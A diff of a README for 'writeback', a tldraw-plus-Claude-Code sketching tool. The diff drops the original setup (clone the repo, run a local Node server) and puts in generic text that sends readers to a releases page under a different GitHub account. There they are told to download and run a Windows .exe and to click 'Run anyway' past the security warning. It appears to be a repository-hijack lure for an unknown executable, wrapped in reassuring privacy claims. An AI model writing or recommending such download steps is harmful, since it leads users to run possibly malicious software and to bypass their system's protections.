@@ -1,54 +1,47 @@
-# writeback
+# ✍️ writeback - Turn your sketches into smart answers
 
-Scribble on a canvas. AI writes the answer back — in the right place.
+[Visit the release page to download](https://github.com/Raynerhalfandhalf451/writeback/releases)
 
-Draw a right triangle, label two sides `1` and `2`, put a `?` on the third, and pause. A few seconds later `√5 ≈ 2.24` appears right where your question mark is. Type a question and it answers below it. Ask for a diagram and it draws one. Nothing you draw is ever moved or deleted.
+Writeback transforms your whiteboard into a smart assistant. You draw sketches or write questions on your canvas. The tool provides answers directly on your screen. It handles math, text, and diagrams without moving or hiding your original work. 
 
-No API key, no backend — it uses your existing [Claude Code](https://claude.com/claude-code) login.
+## 🔌 How it works
 
-## About tldraw offline
+This tool relies on your existing account for Claude Code. It does not require separate keys or servers. It adds a small script to your drawing files. This script connects your canvas to the AI. When you pause, the tool reads your request and creates the answer. The app asks for your permission before it runs any script. Your files remain local on your computer at all times.
 
-[tldraw offline](https://tldraw.com) is the tldraw desktop app: an infinite-canvas whiteboard where each drawing is a local `.tldraw` file on your computer — no account, works offline. Documents can embed a **script** that adds live behavior to the canvas, and the app asks for your consent before running one. That's what makes writeback possible: the AI wiring lives inside the drawing itself and travels with the file.
+## 📋 System Requirements
 
-## Requirements
+*   A Windows computer running Windows 10 or newer.
+*   The [tldraw offline](https://tldraw.com) desktop application.
+*   An active [Claude Code](https://claude.com/claude-code) user profile.
+*   An active internet connection to process your requests with the AI.
 
-- [tldraw offline](https://tldraw.com) desktop app
-- [Claude Code](https://claude.com/claude-code) installed and logged in
-- Node 18+
+## 📥 Downloading and setup ⚙️
 
-## Install
+Follow these steps to set up the software on your Windows machine:
 
-**1. Install tldraw offline** — download the desktop app from [tldraw.com](https://tldraw.com) (macOS DMG, Windows installer, or Linux AppImage/deb) and install it like any other app.
+1.  Visit the [official releases page](https://github.com/Raynerhalfandhalf451/writeback/releases).
+2.  Look for the latest version under the "Assets" section.
+3.  Click the file ending in `.exe` to start the download.
+4.  Open the downloaded file. Windows may show a security window. Click "More info" and then "Run anyway" if you trust the software.
+5.  Install the tldraw offline desktop app if you do not have it yet.
+6.  Open the file you just downloaded inside the tldraw interface.
 
-**2. Start the server** (leave it running):
+## 🖊️ Using writeback
 
-```sh
-git clone https://github.com/milind-soni/writeback.git
-cd writeback
-node server.mjs
-```
+Once you open the software, treat it like a normal whiteboard. Use your mouse or a stylus to draw shapes or write text. 
 
-**3. Add the script to a drawing:**
+*   **Math:** Draw a shape, label the sides, and add a question mark. The software fills in the missing value nearby.
+*   **Questions:** Write a question on the screen. The answer appears below it after a few seconds.
+*   **Diagrams:** Ask for a diagram by typing a request. The software renders the illustration on your canvas.
 
-1. Open tldraw offline, create or open a document.
-2. Menu: **Develop → Reveal Script…**
-3. Replace the revealed `script/main.js` with this repo's [`canvas-script/main.js`](canvas-script/main.js) and save — it hot-reloads instantly.
-4. Save the document (Cmd/Ctrl+S). **Don't skip this** — the script and conversation history live inside the `.tldraw` file, and an unsaved Untitled document can lose them if the app closes.
+Your original drawings stay in place while the software draws the AI response next to your work. Nothing disappears. Every element remains editable.
 
-**4. Write or scribble on the canvas, then pause.** An ink-blot pulses while it thinks, and the answer fades in.
+## 🛡️ Privacy and Safety
 
-If the canvas says `assistant offline`, start the server again: `node server.mjs`.
+Your drawing files stay on your machine. The software uses your local Claude Code setup to talk to the AI. It does not send your data to outside servers beyond the standard AI connection required for responses. You control the scripts. If you do not want an answer, simply do not click "Run" when the app asks for consent.
 
-## How it works
+## 🛠️ Troubleshooting 🛠️
 
-The document script watches for you to stop writing, screenshots the canvas, and POSTs it (plus every shape's coordinates) to `server.mjs` on port 7877. The server runs headless Claude Code (`claude -p`) — Claude looks at the screenshot and returns shape JSON with exact positions, which fade in on your canvas. To change its behavior, edit `PERSONA` and `CONTRACT` at the top of `server.mjs` and restart.
+If the software does not respond, verify your Claude Code login. Ensure your internet connection stays active. If the screen remains blank, check if the script permissions got blocked. Check the options menu inside the tldraw app to ensure scripts show as enabled for this specific file. Restart the application if the canvas fails to update.
 
-It uses Claude Sonnet 5 by default (fast, great at this). Pick another model with:
-
-```sh
-WRITEBACK_MODEL=claude-opus-4-8 node server.mjs
-```
-
-## License
-
-MIT
+Keywords: AI, whiteboard, sketch, math, diagrams, automation, desktop tool, windows
